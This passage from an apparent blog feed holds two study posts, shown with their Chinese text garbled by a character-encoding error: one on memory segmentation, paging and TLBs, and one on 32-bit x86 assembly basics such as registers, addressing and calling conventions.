title="æ®µåç§»é‡"></a>æ®µåç§»é‡</h4><p>åç§»é‡å®šä¹‰ä¸ºï¼šæŠŠå­˜å‚¨å•å…ƒçš„<strong>å®é™…åœ°å€</strong>ä¸å…¶æ‰€åœ¨æ®µçš„<strong>æ®µåœ°å€</strong>ä¹‹é—´çš„è·ç¦»ç§°ä¸ºæ®µå†…åç§»ï¼Œä¹Ÿç§°ä¸ºâ€œæœ‰æ•ˆåœ°å€â€æˆ–â€œåç§»é‡â€ã€‚</p><p>è™šæ‹Ÿåœ°å€ä¸­çš„æ®µåç§»é‡åº”è¯¥ä½äº0å’Œæ®µç•Œé™ä¹‹é—´ã€‚å¦‚æœæ®µå†…åç§»é‡æ˜¯åˆæ³•çš„ï¼Œå°±å°†å…¶æ®µåŠåœ°å€åŠ åˆ°æ®µå†…åç§»é‡å¾—åˆ°ç‰©ç†å†…å­˜åœ°å€ã€‚</p><p>åˆ†æ®µæœºåˆ¶ä¼šæŠŠç¨‹åºçš„è™šæ‹Ÿåœ°å€åˆ†æˆ 4 ä¸ªæ®µï¼Œæ¯ä¸ªæ®µåœ¨æ®µè¡¨ä¸­æœ‰ä¸€ä¸ªé¡¹ï¼Œåœ¨è¿™ä¸€é¡¹æ‰¾åˆ°æ®µçš„åŸºåœ°å€ï¼Œå†åŠ ä¸Šåç§»é‡ï¼Œäºæ˜¯å°±èƒ½æ‰¾åˆ°ç‰©ç†å†…å­˜ä¸­çš„åœ°å€ã€‚</p><h4 id="å­˜åœ¨çš„é—®é¢˜"><a href="#å­˜åœ¨çš„é—®é¢˜" class="headerlink" title="å­˜åœ¨çš„é—®é¢˜"></a>å­˜åœ¨çš„é—®é¢˜</h4><ul><li>å†…å­˜ç¢ç‰‡</li></ul><p>ä¸¾ä¾‹æ¥è¯´ã€‚å‡è®¾æˆ‘ä»¬ç°åœ¨å æœ‰ 1G çš„ç‰©ç†å†…å­˜ï¼Œç”¨æˆ·æ‰§è¡Œäº†å¤šä¸ªç¨‹åºï¼Œæ¸¸æˆå ç”¨äº† 512MB å†…å­˜ï¼Œæµè§ˆå™¨å ç”¨äº† 128MB å†…å­˜ï¼ŒéŸ³ä¹å ç”¨äº† 256 MB å†…å­˜ã€‚</p><p>è¿™ä¸ªæ—¶å€™ï¼Œæˆ‘ä»¬å…³é—­æµè§ˆå™¨ï¼Œåˆ™ç©ºé—²å†…å­˜è¿˜æœ‰ 1024 - 512 - 256 &#x3D; 256MBã€‚ä½†å¦‚æœè¿™ä¸ª 256MB ä¸æ˜¯è¿ç»­çš„ï¼Œè¢«åˆ†æˆäº†ä¸¤æ®µ 128 MB å†…å­˜ï¼Œè¿™å°±ä¼šå¯¼è‡´æ²¡æœ‰ç©ºé—´å†æ‰“å¼€ä¸€ä¸ª 200MB çš„ç¨‹åºã€‚</p><p><img src="/img/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%EF%BC%8C%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E5%92%8C%E9%80%BB%E8%BE%91%E5%9C%B0%E5%9D%80/v2-4803e11dc95cf478d95674f25efd9a7f_720w.webp"></p><p>è¿™é‡Œçš„å†…å­˜ç¢ç‰‡çš„é—®é¢˜å…±æœ‰ä¸¤å¤„åœ°æ–¹ï¼š</p><p>å¤–éƒ¨å†…å­˜ç¢ç‰‡ï¼Œä¹Ÿå°±æ˜¯äº§ç”Ÿäº†å¤šä¸ª<strong>ä¸è¿ç»­</strong>çš„å°ç‰©ç†å†…å­˜ï¼Œå¯¼è‡´æ–°çš„ç¨‹åºæ— æ³•è¢«è£…è½½ï¼›</p><p>å†…éƒ¨å†…å­˜ç¢ç‰‡ï¼Œç¨‹åºæ‰€æœ‰çš„å†…å­˜éƒ½è¢«è£…è½½åˆ°äº†ç‰©ç†å†…å­˜ï¼Œä½†æ˜¯è¿™ä¸ªç¨‹åºæœ‰éƒ¨åˆ†çš„å†…å­˜å¯èƒ½å¹¶ä¸æ˜¯å¾ˆå¸¸ä½¿ç”¨ï¼Œè¿™ä¹Ÿä¼šå¯¼è‡´<strong>å†…å­˜çš„æµªè´¹</strong></p><ul><li>å†…å­˜äº¤æ¢æ•ˆç‡ä½</li></ul><p>å¯¹äºå¤–éƒ¨å†…å­˜ç¢ç‰‡çš„é—®é¢˜ï¼Œæˆ‘ä»¬é‡‡ç”¨å†…å­˜äº¤æ¢çš„è§£å†³æªæ–½ã€‚</p><p>å¯ä»¥æŠŠéŸ³ä¹ç¨‹åºå ç”¨çš„é‚£ 256MB å†…å­˜å†™åˆ°ç¡¬ç›˜ä¸Šï¼Œç„¶åå†ä»ç¡¬ç›˜ä¸Šè¯»å›æ¥åˆ°å†…å­˜é‡Œã€‚ä¸è¿‡å†è¯»å›çš„æ—¶å€™ï¼Œæˆ‘ä»¬ä¸èƒ½è£…è½½å›åŸæ¥çš„ä½ç½®ï¼Œè€Œæ˜¯ç´§ç´§è·Ÿç€é‚£å·²ç»è¢«å ç”¨äº†çš„ 512MB å†…å­˜åé¢ã€‚è¿™æ ·å°±èƒ½ç©ºç¼ºå‡ºè¿ç»­çš„ 256MB ç©ºé—´ï¼Œäºæ˜¯æ–°çš„ 200MB ç¨‹åºå°±å¯ä»¥è£…è½½è¿›æ¥ã€‚</p><p>å¯¹äºå¤šè¿›ç¨‹çš„ç³»ç»Ÿæ¥è¯´ï¼Œç”¨åˆ†æ®µçš„æ–¹å¼ï¼Œå†…å­˜ç¢ç‰‡æ˜¯å¾ˆå®¹æ˜“äº§ç”Ÿçš„ï¼Œäº§ç”Ÿäº†å†…å­˜ç¢ç‰‡ï¼Œé‚£ä¸å¾—ä¸é‡æ–°é‡æ–°è§„åˆ’å†…å­˜åŒºåŸŸï¼Œè¿™ä¸ªè¿‡ç¨‹ä¼šäº§ç”Ÿæ€§èƒ½ç“¶é¢ˆã€‚</p><p>å› ä¸ºç¡¬ç›˜çš„è®¿é—®é€Ÿåº¦è¦æ¯”å†…å­˜æ…¢å¤ªå¤šäº†ï¼Œæ¯ä¸€æ¬¡å†…å­˜äº¤æ¢ï¼Œæˆ‘ä»¬éƒ½éœ€è¦æŠŠä¸€å¤§æ®µè¿ç»­çš„å†…å­˜æ•°æ®å†™åˆ°ç¡¬ç›˜ä¸Šã€‚</p><p>æ‰€ä»¥ï¼Œ<strong>å¦‚æœå†…å­˜äº¤æ¢çš„æ—¶å€™ï¼Œäº¤æ¢çš„æ˜¯ä¸€ä¸ªå å†…å­˜ç©ºé—´å¾ˆå¤§çš„ç¨‹åºï¼Œè¿™æ ·æ•´ä¸ªæœºå™¨éƒ½ä¼šæ˜¾å¾—å¡é¡¿ã€‚</strong></p><h3 id="å†…å­˜åˆ†é¡µ"><a href="#å†…å­˜åˆ†é¡µ" class="headerlink" title="å†…å­˜åˆ†é¡µ"></a>å†…å­˜åˆ†é¡µ</h3><p>ä¸ºäº†è§£å†³å†…å­˜åˆ†æ®µçš„å†…å­˜ç¢ç‰‡å’Œå†…å­˜äº¤æ¢æ•ˆç‡ä½çš„é—®é¢˜ï¼Œå°±å‡ºç°äº†å†…å­˜åˆ†é¡µã€‚<strong>åˆ†é¡µæ˜¯æŠŠæ•´ä¸ªè™šæ‹Ÿå’Œç‰©ç†å†…å­˜ç©ºé—´åˆ‡æˆä¸€æ®µæ®µå›ºå®šå°ºå¯¸çš„å¤§å°</strong>ã€‚è¿™æ ·ä¸€ä¸ªè¿ç»­å¹¶ä¸”å°ºå¯¸å›ºå®šçš„å†…å­˜ç©ºé—´ï¼Œæˆ‘ä»¬å«<strong>é¡µ</strong>ï¼ˆ<em>Page</em>ï¼‰</p><p>è™šæ‹Ÿåœ°å€ä¸ç‰©ç†åœ°å€ä¹‹é—´é€šè¿‡é¡µè¡¨æ¥æ˜ å°„ï¼š</p><p><img src="/img/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%EF%BC%8C%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E5%92%8C%E9%80%BB%E8%BE%91%E5%9C%B0%E5%9D%80/v2-e63c20d1bace757600fccb051a29eaf6_720w.webp"></p><p>é¡µå­˜å‚¨åœ¨å†…å­˜é‡Œï¼Œç”±CPUçš„å†…å­˜ç®¡ç†å•å…ƒå³MMUè´Ÿè´£æ˜ å°„è½¬æ¢çš„å·¥ä½œå—ï¼Œè¿™æ ·CPU å°±å¯ä»¥ç›´æ¥é€šè¿‡ MMUï¼Œæ‰¾å‡ºè¦å®é™…è¦è®¿é—®çš„ç‰©ç†å†…å­˜åœ°å€ã€‚</p><p>ç”±äºå†…å­˜ç©ºé—´éƒ½æ˜¯é¢„å…ˆåˆ’åˆ†å¥½çš„ï¼Œä¹Ÿå°±ä¸ä¼šåƒåˆ†æ®µä¼šäº§ç”Ÿé—´éš™éå¸¸å°çš„å†…å­˜ã€‚é‡‡ç”¨äº†åˆ†é¡µï¼Œé‚£ä¹ˆé‡Šæ”¾çš„å†…å­˜éƒ½æ˜¯ä»¥é¡µä¸ºå•ä½é‡Šæ”¾çš„ï¼Œä¹Ÿå°±ä¸ä¼šäº§ç”Ÿæ— æ³•ç»™è¿›ç¨‹ä½¿ç”¨çš„å°å†…å­˜ã€‚</p><p>å¦‚æœå†…å­˜ç©ºé—´ä¸å¤Ÿï¼Œæ“ä½œç³»ç»Ÿä¼šæŠŠå…¶ä»–æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹ä¸­çš„ã€Œæœ€è¿‘æ²¡è¢«ä½¿ç”¨ã€çš„å†…å­˜é¡µé¢ç»™é‡Šæ”¾æ‰ï¼Œä¹Ÿå°±æ˜¯æš‚æ—¶å†™åœ¨ç¡¬ç›˜ä¸Šï¼Œç§°ä¸º<strong>æ¢å‡º</strong>ï¼ˆ<em>Swap Out</em>ï¼‰ã€‚ä¸€æ—¦éœ€è¦çš„æ—¶å€™ï¼Œå†åŠ è½½è¿›æ¥ï¼Œç§°ä¸º<strong>æ¢å…¥</strong>ï¼ˆ<em>Swap In</em>ï¼‰ã€‚æ‰€ä»¥ï¼Œä¸€æ¬¡æ€§å†™å…¥ç£ç›˜çš„ä¹Ÿåªæœ‰å°‘æ•°çš„ä¸€ä¸ªé¡µæˆ–è€…å‡ ä¸ªé¡µï¼Œä¸ä¼šèŠ±å¤ªå¤šæ—¶é—´ï¼Œå†…å­˜äº¤æ¢çš„æ•ˆç‡å°±ç›¸å¯¹æ¯”è¾ƒé«˜ã€‚</p><p><img src="/img/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%EF%BC%8C%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E5%92%8C%E9%80%BB%E8%BE%91%E5%9C%B0%E5%9D%80/v2-23f19a580a47fa6c731b32d7df6b6735_720w.webp"></p><p>åœ¨åˆ†é¡µæœºåˆ¶ä¸‹ï¼Œè™šæ‹Ÿåœ°å€åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼Œ<strong>é¡µå·</strong>å’Œ<strong>é¡µå†…åç§»</strong>ã€‚é¡µå·ä½œä¸ºé¡µè¡¨çš„ç´¢å¼•ï¼Œ<strong>é¡µè¡¨</strong>åŒ…å«ç‰©ç†é¡µæ¯é¡µæ‰€åœ¨<strong>ç‰©ç†å†…å­˜çš„åŸºåœ°å€</strong>ï¼Œè¿™ä¸ªåŸºåœ°å€ä¸é¡µå†…åç§»çš„ç»„åˆå°±å½¢æˆäº†ç‰©ç†å†…å­˜åœ°å€</p><h4 id="å…¶ä»–ä¸œè¥¿"><a href="#å…¶ä»–ä¸œè¥¿" class="headerlink" title="å…¶ä»–ä¸œè¥¿"></a>å…¶ä»–ä¸œè¥¿</h4><p>å†æ¥ï¼Œä¸ºäº†è§£å†³ç®€å•åˆ†é¡µäº§ç”Ÿçš„é¡µè¡¨è¿‡å¤§çš„é—®é¢˜ï¼Œå°±æœ‰äº†<strong>å¤šçº§é¡µè¡¨</strong>ï¼Œå®ƒè§£å†³äº†ç©ºé—´ä¸Šçš„é—®é¢˜ï¼Œä½†è¿™å°±ä¼šå¯¼è‡´ CPU åœ¨å¯»å€çš„è¿‡ç¨‹ä¸­ï¼Œéœ€è¦æœ‰å¾ˆå¤šå±‚è¡¨å‚ä¸ï¼ŒåŠ å¤§äº†æ—¶é—´ä¸Šçš„å¼€é”€ã€‚äºæ˜¯æ ¹æ®ç¨‹åºçš„<strong>å±€éƒ¨æ€§åŸç†</strong>ï¼Œåœ¨ CPU èŠ¯ç‰‡ä¸­åŠ å…¥äº† <strong>TLB</strong>ï¼Œè´Ÿè´£ç¼“å­˜æœ€è¿‘å¸¸è¢«è®¿é—®çš„é¡µè¡¨é¡¹ï¼Œå¤§å¤§æé«˜äº†åœ°å€çš„è½¬æ¢é€Ÿåº¦ã€‚</p><hr><p>å†²æµªå†²åˆ°çš„ï¼Œæˆ‘è§‰å¾—æ¯”èµ·æ¯ç‡¥çš„æ–‡å­—ï¼Œè¿™ä¸ªæ›´å¥½ç†è§£</p><p><img src="/img/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%EF%BC%8C%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E5%92%8C%E9%80%BB%E8%BE%91%E5%9C%B0%E5%9D%80/Snipaste_2023-03-29_21-54-52.png"></p><hr><p>ä¹‹å‰è§‰å¾—è‡ªå·±å¾ˆç‰›ç›´æ¥å¼€å§‹åšé¢˜ï¼Œé ä¸€äº›è€æœ¬è¿˜æ˜¯èƒ½åšå‡ é“é¢˜ï¼Œä½†æœ€è¿‘å‘ç°åç§»é‡å’Œå†…å­˜åœ°å€å•¥çš„æ ¹æœ¬ä¸ä¼šçœ‹ä¹Ÿä¸ä¼šç®—ï¼Œè¿˜æ˜¯è€è€å®å®æ‰“åŸºç¡€å­ğŸ˜³</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>x86æ±‡ç¼–åŸºç¡€</title>
    <link href="/2023/03/27/x86%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/"/>
    <url>/2023/03/27/x86%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<p>32bitçš„x86æ±‡ç¼–åŸºç¡€ï¼ŒåŒ…æ‹¬ä¸€äº›å¸¸è§„æŒ‡ä»¤ï¼Œå†…å­˜å’Œå¯»å€æ¨¡å¼</p><span id="more"></span><p>æ€»è§‰å¾—å­¦äº†åˆå¥½åƒæ²¡å­¦Â·Â·Â·Â·Â·Â·</p><h1 id="å¯„å­˜å™¨"><a href="#å¯„å­˜å™¨" class="headerlink" title="å¯„å­˜å™¨"></a>å¯„å­˜å™¨</h1><p><img src="/img/x86%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/x86-registers.png"></p><p>ç°ä»£ x86 å¤„ç†å™¨æœ‰ 8 ä¸ª 32 bit å¯„å­˜å™¨ï¼Œå¦‚ä¸Šå›¾æ‰€ç¤ºã€‚</p><p>å¯„å­˜å™¨åå­—æ˜¯æ—©æœŸè®¡ç®—æœºå†å²ä¸Šæµä¼ ä¸‹æ¥çš„ã€‚</p><ul><li>EAXï¼šä¸€èˆ¬ç”¨ä½œç´¯åŠ å™¨(Accumulator)</li><li>EBXï¼šä¸€èˆ¬ç”¨ä½œåŸºå€å¯„å­˜å™¨(Base)</li><li>ECXï¼šä¸€èˆ¬ç”¨æ¥è®¡æ•°(Count)</li><li>EDXï¼šä¸€èˆ¬ç”¨æ¥å­˜æ”¾æ•°æ®(Data)</li><li>ESIï¼šä¸€èˆ¬ç”¨ä½œæºå˜å€(Source Index)</li><li>EDIï¼šä¸€èˆ¬ç”¨ä½œç›®æ ‡å˜å€(Destinatin Index)</li><li>ESPï¼šä¸€èˆ¬ç”¨ä½œå †æ ˆæŒ‡é’ˆ(Stack Pointer)</li><li>EBPï¼šä¸€èˆ¬ç”¨ä½œåŸºå€æŒ‡é’ˆ(Base Pointer)</li></ul><p>ç°åœ¨å¤§éƒ¨åˆ†å¯„å­˜å™¨çš„åå­—å·²ç»å¤±å»äº†åŸæ¥çš„æ„ä¹‰ï¼Œä½†æœ‰ä¸¤ä¸ªæ˜¯ä¾‹å¤–ï¼š<strong>æ ˆæŒ‡é’ˆå¯„å­˜å™¨ï¼ˆStack Pointerï¼‰ESP å’ŒåŸºå€å¯„å­˜å™¨ï¼ˆ Base Pointerï¼‰EBP</strong>ã€‚</p><p>å¯¹äº <code>EAX</code>, <code>EBX</code>, <code>ECX</code>, <code>EDX</code> å››ä¸ªå¯„å­˜å™¨ï¼Œå¯ä»¥å†å°† 32bit åˆ’åˆ†æˆå¤šä¸ªå­å¯„å­˜å™¨ï¼Œ æ¯ä¸ªå­å¯„å­˜å™¨æœ‰ä¸“é—¨çš„åå­—ã€‚ä¾‹å¦‚ <code>EAX</code> çš„é«˜ 16bit å« <code>AX</code>ï¼ˆå»æ‰ E, æ®è¯´Eè¡¨ç¤º Extendedï¼‰,ä½ 8bit å« <code>AL</code> (Lowï¼‰, 8-16bit å« <code>AH</code> ï¼ˆHighï¼‰ã€‚</p><p>åœ¨æ±‡ç¼–è¯­è¨€ä¸­ï¼Œè¿™äº›å¯„å­˜å™¨çš„åå­—æ˜¯<strong>å¤§å°å†™æ— å…³</strong>çš„ï¼Œæ—¢å¯ä»¥ç”¨ <code>EAX</code>ï¼Œä¹Ÿå¯ä»¥å†™ <code>eax</code>ã€‚</p><h1 id="å†…å­˜å’Œå¯»å€æ¨¡å¼"><a href="#å†…å­˜å’Œå¯»å€æ¨¡å¼" class="headerlink" title="å†…å­˜å’Œå¯»å€æ¨¡å¼"></a>å†…å­˜å’Œå¯»å€æ¨¡å¼</h1><h3 id="ç¨‹åºé‡å®šä½"><a href="#ç¨‹åºé‡å®šä½" class="headerlink" title="ç¨‹åºé‡å®šä½"></a>ç¨‹åºé‡å®šä½</h3><ul><li>å­˜æ”¾ç¨‹åºçš„ä¸ºä»£ç æ®µï¼Œå­˜æ”¾æ•°æ®çš„ä¸ºæ•°æ®æ®µ</li><li>çœŸå®çš„å†…å­˜å•å…ƒåœ°å€ç§°ä¸ºç‰©ç†åœ°å€ï¼Œè€Œç¨‹åºä¸­çš„åœ°å€ä¸ºé€»è¾‘åœ°å€</li></ul><p>ç”±äºç¨‹åºå¹¶ä¸çŸ¥é“è‡ªå·±ä¼šè¢«åŠ è½½åˆ°å“ªï¼Œå› æ­¤è®¿å­˜å¦‚æœç”¨ç»å¯¹åœ°å€å°†ä¼šå‡ºé”™ï¼Œåœ¨æ‰§è¡Œç¨‹åºæ—¶å°±éœ€è¦<strong>ç¨‹åºé‡å®šä½</strong>è¿™ä¸ªæ“ä½œã€‚</p><p>è¯¥æ“ä½œåœ¨æ±‡ç¼–ä¸­é€šè¿‡<code>org</code>æŒ‡ä»¤å®ç°ï¼Œå¦‚<code>org 0A100h</code>ä»£è¡¨è¯¥ç¨‹åºä¸­çš„æ‰€æœ‰æ ‡å·éƒ½ä»¥<code>0A100h</code>åšåç§»ã€‚</p><h3 id="å†…å­˜åˆ†æ®µ"><a href="#å†…å­˜åˆ†æ®µ" class="headerlink" title="å†…å­˜åˆ†æ®µ"></a>å†…å­˜åˆ†æ®µ</h3><p>å°†å†…å­˜åˆ†æ®µåï¼Œç¨‹åºåªéœ€è¦è¯†åˆ«åç§»åœ°å€å°±å¯ä»¥ç¡®å®šæ•°æ®ä½ç½®ã€‚ç¨‹åºé‡å®šä½é€šè¿‡è®¾ç½®ä»£ç æ®µCSå¯„å­˜å™¨å’Œæ•°æ®æ®µDSå¯„å­˜å™¨å®ç°ã€‚</p><p>åœ¨8086ä¸­ï¼Œåœ°å€æ€»çº¿æ˜¯20ä½çš„ï¼Œéœ€è¦å°†æ®µå¯„å­˜å™¨å·¦ç§»4ä½ï¼ˆ<code>0x10h</code>ï¼Œç›¸å½“äº16è¿›åˆ¶å·¦ç§»1ä½ï¼‰å˜ä¸º20ä½ï¼Œç„¶åå†åŒåç§»åœ°å€ç›¸åŠ ã€‚</p><p>ä¸¤ç§å…¸å‹æƒ…å†µ</p><ul><li>å› ä¸ºæ®µå¯„å­˜å™¨æ˜¯16ä½çš„ï¼Œåœ¨æ®µä¸é‡å çš„æƒ…å†µä¸‹ï¼Œæœ€å¤šå¯ä»¥å°†1MBçš„å†…å­˜åˆ†æˆ65536ä¸ªæ®µï¼Œæ¯ä¸ªæ®µ16Bï¼Œåç§»åœ°å€ä»<code>0000H</code>åˆ°<code>000FH</code></li><li>åŒæ ·åœ¨ä¸å…è®¸æ®µä¹‹é—´é‡å çš„æƒ…å†µä¸‹ï¼Œå› ä¸ºåç§»åœ°å€ä¹Ÿæ˜¯16ä½ï¼Œ1MBçš„å†…å­˜æœ€å¤šåªèƒ½åˆ’åˆ†æˆ16ä¸ªæ®µï¼Œæ¯æ®µé•¿64KBï¼Œæ®µåœ°å€ç”±<code>0000H</code>åˆ°<code>F000H</code></li></ul><h3 id="å£°æ˜é™æ€æ•°æ®åŒº"><a href="#å£°æ˜é™æ€æ•°æ®åŒº" class="headerlink" title="å£°æ˜é™æ€æ•°æ®åŒº"></a>å£°æ˜é™æ€æ•°æ®åŒº</h3><p><code>.DATA</code>ï¼šå£°æ˜é™æ€å­˜å‚¨åŒº</p><p>æ•°æ®ç±»å‹ä¿®é¥°è¯­ï¼š</p><p><code>DB/db</code>ï¼šByte,1Byte</p><p><code>DW/dw</code>ï¼šWord,2Byte</p><p><code>DD/dd</code>ï¼šDouble Word,4Bytes</p><p>ğŸŒ°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.DATA<br>var     DB 64    ; å£°æ˜ä¸€ä¸ª byte å€¼, referred to as location var, containing the value 64.<br>var2    DB ?     ; å£°æ˜ä¸€ä¸ªæœªåˆå§‹åŒ– byte å€¼, referred to as location var2.<br>        DB 10    ; å£°æ˜ä¸€ä¸ªæ²¡æœ‰ label çš„ byte å€¼, containing the value 10. Its location is var2 + 1.<br>X       DW ?     ; å£°æ˜ä¸€ä¸ª 2-byte æœªåˆå§‹åŒ–å€¼, referred to as location X.<br>Y       DD 30000 ; å£°æ˜ä¸€ä¸ª 4-byte å€¼, referred to as location Y, initialized to 30000.<br></code></pre></td></tr></table></figure><p><strong>åœ¨æ±‡ç¼–ä¸­åªæœ‰ä¸€ç»´æ•°ç»„</strong>ï¼Œæ²¡æœ‰äºŒç»´å’Œå¤šç»´æ•°ç»„ã€‚ä¸€ç»´æ•°ç»„å…¶å®å°±æ˜¯å†…å­˜ä¸­çš„ä¸€å—è¿ç»­åŒºåŸŸã€‚<code>DUP</code> å’Œå­—ç¬¦ä¸²å¸¸é‡ä¹Ÿæ˜¯å£°æ˜æ•°ç»„çš„ä¸¤ç§æ–¹æ³•ã€‚</p><p>ğŸŒ°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">Z       DD 1, 2, 3      ; å£°æ˜ 3 ä¸ª 4-byte values, åˆå§‹åŒ–ä¸º 1, 2, and 3. The value of location Z + 8 will be 3.<br>bytes   DB 10 DUP(?)    ; å£°æ˜ 10 ä¸ª uninitialized bytes starting at location bytes.<br>arr     DD 100 DUP(0)   ; å£°æ˜ 100 ä¸ª 4-byte words starting at location arr, all initialized to 0<br>str     DB &#x27;hello&#x27;,0    ; å£°æ˜ 6 bytes starting at the address str, åˆå§‹åŒ–ä¸º hello and the null (0) byte.<br></code></pre></td></tr></table></figure><h3 id="å†…å­˜å¯»å€"><a href="#å†…å­˜å¯»å€" class="headerlink" title="å†…å­˜å¯»å€"></a>å†…å­˜å¯»å€</h3><p>æœ‰å¤šä¸ªæŒ‡ä»¤å¯ä»¥ç”¨äºå†…å­˜å¯»å€ã€‚å¦‚æœè¦è®¿é—®æŸä¸€å¤§å°çš„å†…å­˜ï¼Œåˆ™é€šè¿‡æ·»åŠ ä¿®é¥°è¯<code>byte</code>ã€<code>word</code>ã€<code>dword</code>å®ç°ã€‚</p><p>ğŸŒ°ï¼š</p><p>å…¶ä¸­<code>MOV</code> å°†åœ¨å†…å­˜å’Œå¯„å­˜å™¨ä¹‹é—´ç§»åŠ¨æ•°æ®ï¼Œæ¥å—ä¸¤ä¸ªå‚æ•°ï¼šç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç›®çš„åœ°ï¼Œç¬¬äºŒä¸ªæ˜¯æºã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov byte[ebx], 2<br></code></pre></td></tr></table></figure><h3 id="å‡½æ•°è°ƒç”¨-call-å †æ ˆç»„ç»‡"><a href="#å‡½æ•°è°ƒç”¨-call-å †æ ˆç»„ç»‡" class="headerlink" title="å‡½æ•°è°ƒç”¨(call)å †æ ˆç»„ç»‡"></a>å‡½æ•°è°ƒç”¨(call)å †æ ˆç»„ç»‡</h3><h4 id="Callerè§„åˆ™"><a href="#Callerè§„åˆ™" class="headerlink" title="Callerè§„åˆ™"></a>Callerè§„åˆ™</h4><ol><li>åœ¨è°ƒç”¨å‡½æ•°&#x2F;å­ç¨‹åº(subroutine)ä¹‹å‰ï¼Œå…ˆä¿å­˜ç‰¹å®šå¯„å­˜å™¨çš„çŠ¶æ€(caller-saved)ï¼ˆåŒ…æ‹¬<code>eax</code>ã€<code>ecx</code>ã€<code>edx</code>ï¼‰</li><li>å°†è¦ä¼ çš„å‚æ•°å †æ ˆï¼ˆæ³¨æ„è¦é€†åºï¼Œ<strong>æœ€åä¸€ä¸ªå‚æ•°æœ€å…ˆå…¥</strong>ï¼‰ã€‚å› ä¸ºæ ˆå¾€ä¸‹ç”Ÿé•¿ï¼Œå› æ­¤ç¬¬ä¸€ä¸ªå‚æ•°ä¼šè¢«å­˜åœ¨æœ€ä½çš„åœ°å€</li><li>è°ƒç”¨å‡½æ•°ï¼Œ<code>call</code>ä¼šå°†è¿”å›åœ°å€<code>eip</code>å‹å…¥æ ˆä¸­</li><li>è¿”å›æ—¶å…ˆæŠŠå‚æ•°ç§»å‡ºæ ˆï¼Œç„¶åå°†åŸæ¥ä¿å­˜çš„å¯„å­˜å™¨å†popå‡ºæ¥</li></ol><h4 id="Calleeè§„åˆ™"><a href="#Calleeè§„åˆ™" class="headerlink" title="Calleeè§„åˆ™"></a>Calleeè§„åˆ™</h4><ol><li><p>å°†<code>ebp</code>æ¨å…¥æ ˆï¼Œå°†<code>esp</code>çš„å€¼æ‹·è´å…¥<code>ebp</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">push ebp<br>mov ebp, esp<br></code></pre></td></tr></table></figure></li><li><p>åˆ†é…å±€éƒ¨å˜é‡ï¼Œæ ˆç”±ä¸Šå‘ä¸‹å¢é•¿ï¼Œå¦‚åˆ†é…3ä¸ª4Bï¼Œåˆ™<code>sub esp, 12</code></p></li><li><p>ä¿å­˜å¯„å­˜å™¨çŠ¶æ€</p></li></ol><h1 id="å¸¸è§æŒ‡ä»¤"><a href="#å¸¸è§æŒ‡ä»¤" class="headerlink" title="å¸¸è§æŒ‡ä»¤"></a>å¸¸è§æŒ‡ä»¤</h1><p>æœºå™¨æŒ‡ä»¤é€šå¸¸åˆ†ä¸ºä¸‰ç±»ï¼šæ•°æ®ç§»åŠ¨ã€ç®—æœ¯&#x2F;é€»è¾‘å’Œæ§åˆ¶æµã€‚</p><p>æ¥ä¸‹æ¥çš„ç¬¦å·è§£é‡Šå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">&lt;reg32&gt; ; ä»»ä½•32ä½å¯„å­˜å™¨ ï¼ˆEAX, EBX, ECX, EDX, ESI, EDI, ESP, or EBPï¼‰<br>&lt;reg16&gt;; ä»»ä½•16ä½å¯„å­˜å™¨ ï¼ˆAX, BX, CX, or DXï¼‰<br>&lt;reg8&gt;; ä»»ä½•8ä½å¯„å­˜å™¨ ï¼ˆAH, BH, CH, DH, AL, BL, CL, or DLï¼‰<br>&lt;reg&gt;; ä»»ä½•å¯„å­˜å™¨<br>&lt;mem&gt;; ä¸€ä¸ªå†…å­˜åœ°å€ ï¼ˆe.g., [eax], [var + 4], or dword ptr [eax+ebx]ï¼‰<br>&lt;con32&gt;; ä»»ä½•32ä½å¸¸é‡<br>&lt;con16&gt;; ä»»ä½•16ä½å¸¸é‡<br>&lt;con8&gt;; ä»»ä½•8ä½å¸¸é‡<br>&lt;con&gt;; ä»»ä½•8ã€16ã€32ä½å¸¸é‡<br></code></pre></td></tr></table></figure><h2 id="æ•°æ®ç§»åŠ¨"><a href="#æ•°æ®ç§»åŠ¨" class="headerlink" title="æ•°æ®ç§»åŠ¨"></a>æ•°æ®ç§»åŠ¨</h2><h4 id="mov"><a href="#mov" class="headerlink" 